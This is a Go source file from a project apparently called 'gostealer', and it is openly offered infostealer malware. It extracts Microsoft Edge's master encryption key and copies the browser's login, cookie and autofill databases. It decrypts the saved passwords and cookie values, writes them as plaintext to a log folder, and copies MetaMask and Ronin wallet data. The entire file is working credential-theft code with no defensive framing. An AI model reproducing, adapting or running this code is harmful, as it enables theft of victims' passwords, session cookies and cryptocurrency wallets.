package browsers

import (
	"database/sql"
	"fmt"
	"log"
	"os"
	"path"

	"github.com/4kord/gostealer/utils"
	"github.com/4kord/gostealer/utils/decrypt"
	"github.com/4kord/gostealer/wallets"

	_ "modernc.org/sqlite"
)

func Edge(browserPath, logFolderPath string) {
	browserKey := decrypt.GetBrowserEncryptedKey(browserPath)

	err := os.WriteFile(path.Join(logFolderPath, "raw", "edge_masterkey.txt"), browserKey, 0644)
	if err != nil {
		log.Println(err)
	}

	browserPasswords := getEdgePasswords(browserPath, logFolderPath, browserKey)
	browserCookies := getEdgeCookies(browserPath, logFolderPath, browserKey)
	browserAutofill := getEdgeAutofill(browserPath, logFolderPath)

	err = os.WriteFile(path.Join(logFolderPath, "Browsers", "Edge", "Passwords.txt"), []byte(browserPasswords), 0644)
	if err != nil {
		log.Println(err)
	}

	err = os.WriteFile(path.Join(logFolderPath, "Browsers", "Edge", "Cookies.txt"), []byte(browserCookies), 0644)
	if err != nil {
		log.Println(err)
	}

	err = os.WriteFile(path.Join(logFolderPath, "Browsers", "Edge", "Autofill.txt"), []byte(browserAutofill), 0644)
	if err != nil {
		log.Println(err)
	}

	wallets.CopyMetamaskEdge(browserPath, logFolderPath)
	wallets.CopyRoninEdge(browserPath, logFolderPath)
}

func getEdgePasswords(browserPath, logFolderPath string, key []byte) string {
	_, err := utils.CopyFile(path.Join(browserPath, "Default", "Login Data"), path.Join(logFolderPath, "raw", "edge_login_data"))
	if err != nil {
		log.Println(fmt.Sprintf("[EDGE] %s", err.Error()))
	}

	sqllitePath := path.Join(browserPath, "Default", "edge_login_data")

	var data string

	db, err := sql.Open("sqlite", fmt.Sprintf("file:%s", sqllitePath))
	if err != nil {
		log.Println(fmt.Sprintf("[EDGE] %s", err.Error()))
	}

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		log.Println(fmt.Sprintf("[EDGE] %s", err.Error()))
	}
	defer rows.Close()

	for rows.Next() {
		entry := PasswordEntry{}
		err := rows.Scan(&entry.OriginUrl, &entry.Username, &entry.Password)
		if err != nil {
			panic(err)
		}

		entry.Password = decrypt.DecryptWithKey(key, []byte(entry.Password))
		data += fmt.Sprintf("URL: %s | Username: %s | Password: %s\n", entry.OriginUrl, entry.Username, entry.Password)
	}
	if err := rows.Err(); err != nil {
		log.Println(fmt.Sprintf("[EDGE] %s", err.Error()))
	}

	return data
}

func getEdgeCookies(browserPath, logFolderPath string, key []byte) string {
	_, err := utils.CopyFile(path.Join(browserPath, "Default", "Network", "Cookies"), path.Join(logFolderPath, "raw", "edge_cookies"))
	if err != nil {
		log.Println(fmt.Sprintf("[EDGE] %s", err.Error()))
	}

	sqllitePath := path.Join(browserPath, "Default", "Network", "edge_cookies")

	var data string

	db, err := sql.Open("sqlite", fmt.Sprintf("file:%s", sqllitePath))
	if err != nil {
		log.Println(fmt.Sprintf("[EDGE] %s", err.Error()))
	}

	rows, err := db.Query("SELECT host_key, path, expires_utc, name, encrypted_value FROM cookies")
	if err != nil {
		log.Println(fmt.Sprintf("[EDGE] %s", err.Error()))
	}
	defer rows.Close()

	for rows.Next() {
		entry := CookieEntry{}
		err := rows.Scan(&entry.Host, &entry.Path, &entry.Expiry, &entry.Name, &entry.Value)
		if err != nil {
			log.Println(fmt.Sprintf("[EDGE] %s", err.Error()))
		}

		entry.Value = decrypt.DecryptWithKey(key, []byte(entry.Value))
		data += fmt.Sprintf("Host: %s | Path: %s | Expiry: %d | Name: %s | Value: %s\n", entry.Host, entry.Path, entry.Expiry, entry.Name, entry.Value)
	}
	if err := rows.Err(); err != nil {
		log.Println(fmt.Sprintf("[EDGE] %s", err.Error()))
	}

	return data
}

func getEdgeAutofill(browserPath, logFolderPath string) string {
	_, err := utils.CopyFile(path.Join(browserPath, "Default", "Web Data"), path.Join(logFolderPath, "raw", "edge_web_data"))
	if err != nil {
		log.Println(fmt.Sprintf("[EDGE] %s", err.Error()))
	}

	sqllitePath := path.Join(browserPath, "Default", "edge_web_data")

	var data string

	db, err := sql.Open("sqlite", fmt.Sprintf("file:%s", sqllitePath))
	if err != nil {
		log.Println(fmt.Sprintf("[EDGE] %s", err.Error()))
	}

	rows, err := db.Query("SELECT name, value FROM autofill")
	if err != nil {
		log.Println(fmt.Sprintf("[EDGE] %s", err.Error()))
	}
	defer rows.Close()

	for rows.Next() {
		entry := AutofillEntry{}
		err := rows.Scan(&entry.Name, &entry.Value)
		if err != nil {
			log.Println(fmt.Sprintf("[EDGE] %s", err.Error()))
		}

		data += fmt.Sprintf("Name: %s | Value: %s\n", entry.Name, entry.Value)
	}
	if err := rows.Err(); err != nil {
		log.Println(fmt.Sprintf("[EDGE] %s", err.Error()))
	}

	return data
}